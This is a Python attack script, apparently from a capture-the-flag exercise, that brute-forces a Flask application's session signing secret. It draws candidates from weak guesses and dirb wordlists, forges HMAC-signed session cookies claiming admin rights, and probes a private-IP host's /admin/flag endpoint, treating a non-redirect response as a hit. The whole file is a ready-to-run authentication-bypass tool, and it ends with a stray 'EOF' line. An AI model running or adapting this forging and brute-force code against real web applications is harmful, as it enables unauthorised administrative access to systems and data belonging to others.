#!/usr/bin/env python3
"""Brute-force Flask session secret over dirb common+big, standard Flask signing.
Oracle: GET /admin/flag, no redirect follow, status != 302 == HIT.
Detector = one "mega" payload superset of all candidate auth fields (1 req/secret).
"""
import base64, hashlib, hmac, json, time, http.client, sys

HOST = "10.0.179.144"; PORT = 80; PATH = "/admin/flag"

def b64url(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def int_to_bytes(n): return n.to_bytes((n.bit_length()+7)//8 or 1, "big")

def forge(secret, payload, now):
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    t = b64url(int_to_bytes(now))
    raw = (p + "." + t).encode()
    key = hmac.new(secret.encode(), b"cookie-session", hashlib.sha1).digest()
    sig = b64url(hmac.new(key, raw, hashlib.sha1).digest())
    return p + "." + t + "." + sig

MEGA = {
    "username": "admin", "user": "admin", "role": "admin", "admin": True,
    "is_admin": True, "isAdmin": True, "id": 1, "user_id": 1,
    "logged_in": True, "login": True, "authenticated": True,
    "debug": True, "level": "admin", "privilege": "admin",
}
INDIVIDUAL = [
    {"username":"admin"}, {"role":"admin"}, {"is_admin":True}, {"user_id":1},
    {"user":"admin"}, {"logged_in":True}, {},
]

def get_status(conn, cookie):
    try:
        conn.request("GET", PATH, headers={"Cookie": "session=" + cookie,
                                           "Connection": "keep-alive"})
        r = conn.getresponse(); s = r.status; r.read()
        return s
    except Exception:
        return -1

def build_secrets():
    weak = ["secret","flask","admin","ctf","flag","asset","company","changeme",
            "8c7f95c36c19","manual_web_8c7f95c36c19","secret_key","SECRET_KEY",
            "password","changeme","supersecretkey","thisisasecretkey","dev","test"]
    files = ["/usr/share/dirb/wordlists/common.txt", "/usr/share/dirb/wordlists/big.txt"]
    seen = set(); out = []
    for w in weak + [""]:
        pass
    cands = weak[:]
    for fp in files:
        try:
            with open(fp, errors="ignore") as f:
                for line in f:
                    s = line.strip()
                    if s and not s.startswith("#"):
                        cands.append(s)
        except Exception as e:
            print("warn", fp, e, flush=True)
    for s in cands:
        if s not in seen:
            seen.add(s); out.append(s)
    return out

def main():
    secrets = build_secrets()
    print(f"[*] {len(secrets)} unique secret candidates", flush=True)
    conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
    # sanity checks
    print("[sanity] garbage cookie:", get_status(conn, "AAAA.BBBB.CCCC"), flush=True)
    print("[sanity] wrong-secret 'secret' mega:", get_status(conn, forge("secret", MEGA, int(time.time()))), flush=True)

    now = int(time.time())
    t0 = time.time()
    errs = 0
    for i, secret in enumerate(secrets):
        # refresh timestamp every 60s so cookie stays fresh
        if i % 1000 == 0:
            now = int(time.time())
        cookie = forge(secret, MEGA, now)
        st = get_status(conn, cookie)
        if st == -1:
            errs += 1
            try: conn.close()
            except Exception: pass
            conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
            try:
                st = get_status(conn, cookie)
            except Exception:
                st = -1
        if st not in (302, 308, -1):
            print(f"\n[HIT] secret={secret!r} payload=MEGA status={st}", flush=True)
            print(f"COOKIE: {cookie}", flush=True)
            # confirm with individual payloads
            for pl in INDIVIDUAL:
                c2 = forge(secret, pl, now)
                s2 = get_status(conn, c2)
                print(f"   individual payload={pl} status={s2}", flush=True)
            return 0
        if (i+1) % 2000 == 0:
            dt = time.time()-t0
            print(f"[*] {i+1}/{len(secrets)} rate={int((i+1)/dt)}/s elapsed={int(dt)}s errs={errs}", flush=True)
    print("[MISS] no hit over full dictionary", flush=True)
    return 1

if __name__ == "__main__":
    sys.exit(main())
EOF
